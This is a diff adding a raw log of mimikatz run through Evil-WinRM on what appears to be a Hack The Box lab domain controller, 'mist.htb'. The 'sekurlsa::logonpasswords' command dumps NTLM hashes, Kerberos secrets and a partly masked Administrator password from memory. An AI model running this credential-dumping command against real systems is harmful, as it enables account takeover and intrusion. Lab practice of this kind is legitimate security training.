@@ -1,0 +1,322 @@
+*Evil-WinRM* PS C:\Users\Administrator\Documents> .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz(commandline) # privilege::debug
+Privilege '20' OK
+
+mimikatz(commandline) # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 91208 (00000000:00016448)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 5/2/2026 8:15:24 AM
+SID               : S-1-5-90-0-1
+        msv :
+         [00000003] Primary
+         * Username : DC01$
+         * Domain   : MIST
+         * NTLM     : e768c4cf883a87ba9e96278990292260
+         * SHA1     : 27bfd2590b8bca31c1ac480fe47251f3c7d935f5
+         * DPAPI    : 27bfd2590b8bca31c1ac480fe47251f3
+        tspkg :
+        wdigest :
+         * Username : DC01$
+         * Domain   : MIST
+         * Password : (null)
+        kerberos :
+         * Username : DC01$
+         * Domain   : mist.htb
+         * Password : c6 8c b8 51 aa 63 12 ad 86 b5 32 db 81 03 02 5c b8 0e 69 02 5b d3 81 86 03 16 ba 55 b0 56 b9 e1 24 8e 78 17 ab 7f c5 b2 3c 23 2a 5b d2 aa 5b 85 15 04 1d c3 dc 47 fa 4e 2d 4c 34 c7 db 40 3c 7e dc 44 18 cf 22 a1 b8 c2 c5 44 c4 64 ec 9f ed ef b1 dc db eb ff 68 c6 e9 a1 03 f6 7f 30 32 b6 8e 77 70 b4 e8 e2 2e f0 5b 29 d0 02 cc 0e 22 ad 48 73 a1 1c e9 ba c4 07 85 dc c5 66 d3 8b b3 e2 f0 d8 25 d2 f4 01 1b 56 6c ce fd c5 5f 09 8c 3b 76 af fb 9a 73 c6 21 2f 69 00 26 55 dd 7b 77 46 73 bf 8e ec ac cd 51 7e 95 50 d8 8e 33 67 7c eb a9 6f 4b c2 73 e4 99 9b bd 51 86 73 34 3c 0a 15 80 4c 43 fd e8 97 c9 bd 57 98 30 25 8b 63 08 97 e7 9d 93 d0 c2 2e dc 2f 93 3c 7e c2 2c 49 51 4a 2e da bd 5d 54 63 46 ce 55 a0 83 3f c2 d8 40 37 80
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : DC01$
+Domain            : MIST
+Logon Server      : (null)
+Logon Time        : 5/2/2026 8:15:24 AM
+SID               : S-1-5-20
+        msv :
+         [00000003] Primary
+         * Username : DC01$
+         * Domain   : MIST
+         * NTLM     : e768c4cf883a87ba9e96278990292260
+         * SHA1     : 27bfd2590b8bca31c1ac480fe47251f3c7d935f5
+         * DPAPI    : 27bfd2590b8bca31c1ac480fe47251f3
+        tspkg :
+        wdigest :
+         * Username : DC01$
+         * Domain   : MIST
+         * Password : (null)
+        kerberos :
+         * Username : dc01$
+         * Domain   : MIST.HTB
+         * Password : (null)
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 59947 (00000000:0000ea2b)
+Session           : Interactive from 0
+User Name         : UMFD-0
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 5/2/2026 8:15:23 AM
+SID               : S-1-5-96-0-0
+        msv :
+         [00000003] Primary
+         * Username : DC01$
+         * Domain   : MIST
+         * NTLM     : e768c4cf883a87ba9e96278990292260
+         * SHA1     : 27bfd2590b8bca31c1ac480fe47251f3c7d935f5
+         * DPAPI    : 27bfd2590b8bca31c1ac480fe47251f3
+        tspkg :
+        wdigest :
+         * Username : DC01$
+         * Domain   : MIST
+         * Password : (null)
+        kerberos :
+         * Username : DC01$
+         * Domain   : mist.htb
+         * Password : c6 8c b8 51 aa 63 12 ad 86 b5 32 db 81 03 02 5c b8 0e 69 02 5b d3 81 86 03 16 ba 55 b0 56 b9 e1 24 8e 78 17 ab 7f c5 b2 3c 23 2a 5b d2 aa 5b 85 15 04 1d c3 dc 47 fa 4e 2d 4c 34 c7 db 40 3c 7e dc 44 18 cf 22 a1 b8 c2 c5 44 c4 64 ec 9f ed ef b1 dc db eb ff 68 c6 e9 a1 03 f6 7f 30 32 b6 8e 77 70 b4 e8 e2 2e f0 5b 29 d0 02 cc 0e 22 ad 48 73 a1 1c e9 ba c4 07 85 dc c5 66 d3 8b b3 e2 f0 d8 25 d2 f4 01 1b 56 6c ce fd c5 5f 09 8c 3b 76 af fb 9a 73 c6 21 2f 69 00 26 55 dd 7b 77 46 73 bf 8e ec ac cd 51 7e 95 50 d8 8e 33 67 7c eb a9 6f 4b c2 73 e4 99 9b bd 51 86 73 34 3c 0a 15 80 4c 43 fd e8 97 c9 bd 57 98 30 25 8b 63 08 97 e7 9d 93 d0 c2 2e dc 2f 93 3c 7e c2 2c 49 51 4a 2e da bd 5d 54 63 46 ce 55 a0 83 3f c2 d8 40 37 80
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 59921 (00000000:0000ea11)
+Session           : Interactive from 1
+User Name         : UMFD-1
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 5/2/2026 8:15:23 AM
+SID               : S-1-5-96-0-1
+        msv :
+         [00000003] Primary
+         * Username : DC01$
+         * Domain   : MIST
+         * NTLM     : e768c4cf883a87ba9e96278990292260
+         * SHA1     : 27bfd2590b8bca31c1ac480fe47251f3c7d935f5
+         * DPAPI    : 27bfd2590b8bca31c1ac480fe47251f3
+        tspkg :
+        wdigest :
+         * Username : DC01$
+         * Domain   : MIST
+         * Password : (null)
+        kerberos :
+         * Username : DC01$
+         * Domain   : mist.htb
+         * Password : c6 8c b8 51 aa 63 12 ad 86 b5 32 db 81 03 02 5c b8 0e 69 02 5b d3 81 86 03 16 ba 55 b0 56 b9 e1 24 8e 78 17 ab 7f c5 b2 3c 23 2a 5b d2 aa 5b 85 15 04 1d c3 dc 47 fa 4e 2d 4c 34 c7 db 40 3c 7e dc 44 18 cf 22 a1 b8 c2 c5 44 c4 64 ec 9f ed ef b1 dc db eb ff 68 c6 e9 a1 03 f6 7f 30 32 b6 8e 77 70 b4 e8 e2 2e f0 5b 29 d0 02 cc 0e 22 ad 48 73 a1 1c e9 ba c4 07 85 dc c5 66 d3 8b b3 e2 f0 d8 25 d2 f4 01 1b 56 6c ce fd c5 5f 09 8c 3b 76 af fb 9a 73 c6 21 2f 69 00 26 55 dd 7b 77 46 73 bf 8e ec ac cd 51 7e 95 50 d8 8e 33 67 7c eb a9 6f 4b c2 73 e4 99 9b bd 51 86 73 34 3c 0a 15 80 4c 43 fd e8 97 c9 bd 57 98 30 25 8b 63 08 97 e7 9d 93 d0 c2 2e dc 2f 93 3c 7e c2 2c 49 51 4a 2e da bd 5d 54 63 46 ce 55 a0 83 3f c2 d8 40 37 80
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 384484 (00000000:0005dde4)
+Session           : Batch from 0
+User Name         : Administrator
+Domain            : MIST
+Logon Server      : DC01
+Logon Time        : 5/2/2026 8:16:04 AM
+SID               : S-1-5-21-1045809509-3006658589-2426055941-500
+        msv :
+         [00000003] Primary
+         * Username : Administrator
+         * Domain   : MIST
+         * NTLM     : b46782b9365344abdff1a925601e0385
+         * SHA1     : 9305d72f1f4136d2cad6b85e8534754196b21a44
+         * DPAPI    : db6a54ab62e68d2473fda1f9122eea48
+        tspkg :
+        wdigest :
+         * Username : Administrator
+         * Domain   : MIST
+         * Password : (null)
+        kerberos :
+         * Username : Administrator
+         * Domain   : mist.htb
+         * Password : FrXXXXXXXXXXXXXXXXXXXXXXXXX123!
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 163257 (00000000:00027db9)
+Session           : Service from 0
+User Name         : 5CEA0817-722C-4DAA-BDE3-B17600B05288
+Domain            : NT VIRTUAL MACHINE
+Logon Server      : (null)
+Logon Time        : 5/2/2026 8:15:27 AM
+SID               : S-1-5-83-1-1558841367-1303015980-1991369661-2287120384
+        msv :
+         [00000003] Primary
+         * Username : DC01$
+         * Domain   : MIST
+         * NTLM     : e768c4cf883a87ba9e96278990292260
+         * SHA1     : 27bfd2590b8bca31c1ac480fe47251f3c7d935f5
+         * DPAPI    : 27bfd2590b8bca31c1ac480fe47251f3
+        tspkg :
+        wdigest :
+         * Username : DC01$
+         * Domain   : MIST
+         * Password : (null)
+        kerberos :
+         * Username : DC01$
+         * Domain   : mist.htb
+         * Password : c6 8c b8 51 aa 63 12 ad 86 b5 32 db 81 03 02 5c b8 0e 69 02 5b d3 81 86 03 16 ba 55 b0 56 b9 e1 24 8e 78 17 ab 7f c5 b2 3c 23 2a 5b d2 aa 5b 85 15 04 1d c3 dc 47 fa 4e 2d 4c 34 c7 db 40 3c 7e dc 44 18 cf 22 a1 b8 c2 c5 44 c4 64 ec 9f ed ef b1 dc db eb ff 68 c6 e9 a1 03 f6 7f 30 32 b6 8e 77 70 b4 e8 e2 2e f0 5b 29 d0 02 cc 0e 22 ad 48 73 a1 1c e9 ba c4 07 85 dc c5 66 d3 8b b3 e2 f0 d8 25 d2 f4 01 1b 56 6c ce fd c5 5f 09 8c 3b 76 af fb 9a 73 c6 21 2f 69 00 26 55 dd 7b 77 46 73 bf 8e ec ac cd 51 7e 95 50 d8 8e 33 67 7c eb a9 6f 4b c2 73 e4 99 9b bd 51 86 73 34 3c 0a 15 80 4c 43 fd e8 97 c9 bd 57 98 30 25 8b 63 08 97 e7 9d 93 d0 c2 2e dc 2f 93 3c 7e c2 2c 49 51 4a 2e da bd 5d 54 63 46 ce 55 a0 83 3f c2 d8 40 37 80
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 5/2/2026 8:15:25 AM
+SID               : S-1-5-19
+        msv :
+        tspkg :
+        wdigest :
+         * Username : (null)
+         * Domain   : (null)
+         * Password : (null)
+        kerberos :
+         * Username : (null)
+         * Domain   : (null)
+         * Password : (null)
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 91189 (00000000:00016435)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 5/2/2026 8:15:24 AM
+SID               : S-1-5-90-0-1
+        msv :
+         [00000003] Primary
+         * Username : DC01$
+         * Domain   : MIST
+         * NTLM     : e768c4cf883a87ba9e96278990292260
+         * SHA1     : 27bfd2590b8bca31c1ac480fe47251f3c7d935f5
+         * DPAPI    : 27bfd2590b8bca31c1ac480fe47251f3
+        tspkg :
+        wdigest :
+         * Username : DC01$
+         * Domain   : MIST
+         * Password : (null)
+        kerberos :
+         * Username : DC01$
+         * Domain   : mist.htb
+         * Password : c6 8c b8 51 aa 63 12 ad 86 b5 32 db 81 03 02 5c b8 0e 69 02 5b d3 81 86 03 16 ba 55 b0 56 b9 e1 24 8e 78 17 ab 7f c5 b2 3c 23 2a 5b d2 aa 5b 85 15 04 1d c3 dc 47 fa 4e 2d 4c 34 c7 db 40 3c 7e dc 44 18 cf 22 a1 b8 c2 c5 44 c4 64 ec 9f ed ef b1 dc db eb ff 68 c6 e9 a1 03 f6 7f 30 32 b6 8e 77 70 b4 e8 e2 2e f0 5b 29 d0 02 cc 0e 22 ad 48 73 a1 1c e9 ba c4 07 85 dc c5 66 d3 8b b3 e2 f0 d8 25 d2 f4 01 1b 56 6c ce fd c5 5f 09 8c 3b 76 af fb 9a 73 c6 21 2f 69 00 26 55 dd 7b 77 46 73 bf 8e ec ac cd 51 7e 95 50 d8 8e 33 67 7c eb a9 6f 4b c2 73 e4 99 9b bd 51 86 73 34 3c 0a 15 80 4c 43 fd e8 97 c9 bd 57 98 30 25 8b 63 08 97 e7 9d 93 d0 c2 2e dc 2f 93 3c 7e c2 2c 49 51 4a 2e da bd 5d 54 63 46 ce 55 a0 83 3f c2 d8 40 37 80
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 60070 (00000000:0000eaa6)
+Session           : Interactive from 1
+User Name         : UMFD-1
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 5/2/2026 8:15:23 AM
+SID               : S-1-5-96-0-1
+        msv :
+         [00000003] Primary
+         * Username : DC01$
+         * Domain   : MIST
+         * NTLM     : e768c4cf883a87ba9e96278990292260
+         * SHA1     : 27bfd2590b8bca31c1ac480fe47251f3c7d935f5
+         * DPAPI    : 27bfd2590b8bca31c1ac480fe47251f3
+        tspkg :
+        wdigest :
+         * Username : DC01$
+         * Domain   : MIST
+         * Password : (null)
+        kerberos :
+         * Username : DC01$
+         * Domain   : mist.htb
+         * Password : c6 8c b8 51 aa 63 12 ad 86 b5 32 db 81 03 02 5c b8 0e 69 02 5b d3 81 86 03 16 ba 55 b0 56 b9 e1 24 8e 78 17 ab 7f c5 b2 3c 23 2a 5b d2 aa 5b 85 15 04 1d c3 dc 47 fa 4e 2d 4c 34 c7 db 40 3c 7e dc 44 18 cf 22 a1 b8 c2 c5 44 c4 64 ec 9f ed ef b1 dc db eb ff 68 c6 e9 a1 03 f6 7f 30 32 b6 8e 77 70 b4 e8 e2 2e f0 5b 29 d0 02 cc 0e 22 ad 48 73 a1 1c e9 ba c4 07 85 dc c5 66 d3 8b b3 e2 f0 d8 25 d2 f4 01 1b 56 6c ce fd c5 5f 09 8c 3b 76 af fb 9a 73 c6 21 2f 69 00 26 55 dd 7b 77 46 73 bf 8e ec ac cd 51 7e 95 50 d8 8e 33 67 7c eb a9 6f 4b c2 73 e4 99 9b bd 51 86 73 34 3c 0a 15 80 4c 43 fd e8 97 c9 bd 57 98 30 25 8b 63 08 97 e7 9d 93 d0 c2 2e dc 2f 93 3c 7e c2 2c 49 51 4a 2e da bd 5d 54 63 46 ce 55 a0 83 3f c2 d8 40 37 80
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 59988 (00000000:0000ea54)
+Session           : Interactive from 0
+User Name         : UMFD-0
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 5/2/2026 8:15:23 AM
+SID               : S-1-5-96-0-0
+        msv :
+         [00000003] Primary
+         * Username : DC01$
+         * Domain   : MIST
+         * NTLM     : e768c4cf883a87ba9e96278990292260
+         * SHA1     : 27bfd2590b8bca31c1ac480fe47251f3c7d935f5
+         * DPAPI    : 27bfd2590b8bca31c1ac480fe47251f3
+        tspkg :
+        wdigest :
+         * Username : DC01$
+         * Domain   : MIST
+         * Password : (null)
+        kerberos :
+         * Username : DC01$
+         * Domain   : mist.htb
+         * Password : c6 8c b8 51 aa 63 12 ad 86 b5 32 db 81 03 02 5c b8 0e 69 02 5b d3 81 86 03 16 ba 55 b0 56 b9 e1 24 8e 78 17 ab 7f c5 b2 3c 23 2a 5b d2 aa 5b 85 15 04 1d c3 dc 47 fa 4e 2d 4c 34 c7 db 40 3c 7e dc 44 18 cf 22 a1 b8 c2 c5 44 c4 64 ec 9f ed ef b1 dc db eb ff 68 c6 e9 a1 03 f6 7f 30 32 b6 8e 77 70 b4 e8 e2 2e f0 5b 29 d0 02 cc 0e 22 ad 48 73 a1 1c e9 ba c4 07 85 dc c5 66 d3 8b b3 e2 f0 d8 25 d2 f4 01 1b 56 6c ce fd c5 5f 09 8c 3b 76 af fb 9a 73 c6 21 2f 69 00 26 55 dd 7b 77 46 73 bf 8e ec ac cd 51 7e 95 50 d8 8e 33 67 7c eb a9 6f 4b c2 73 e4 99 9b bd 51 86 73 34 3c 0a 15 80 4c 43 fd e8 97 c9 bd 57 98 30 25 8b 63 08 97 e7 9d 93 d0 c2 2e dc 2f 93 3c 7e c2 2c 49 51 4a 2e da bd 5d 54 63 46 ce 55 a0 83 3f c2 d8 40 37 80
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 56842 (00000000:0000de0a)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 5/2/2026 8:15:20 AM
+SID               :
+        msv :
+         [00000003] Primary
+         * Username : DC01$
+         * Domain   : MIST
+         * NTLM     : e768c4cf883a87ba9e96278990292260
+         * SHA1     : 27bfd2590b8bca31c1ac480fe47251f3c7d935f5
+         * DPAPI    : 27bfd2590b8bca31c1ac480fe47251f3
+        tspkg :
+        wdigest :
+        kerberos :
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : DC01$
+Domain            : MIST
+Logon Server      : (null)
+Logon Time        : 5/2/2026 8:15:20 AM
+SID               : S-1-5-18
+        msv :
+        tspkg :
+        wdigest :
+         * Username : DC01$
+         * Domain   : MIST
+         * Password : (null)
+        kerberos :
+         * Username : dc01$
+         * Domain   : MIST.HTB
+         * Password : (null)
+        ssp :
+        credman :
+        cloudap :
+
+mimikatz(commandline) # exit
+Bye!
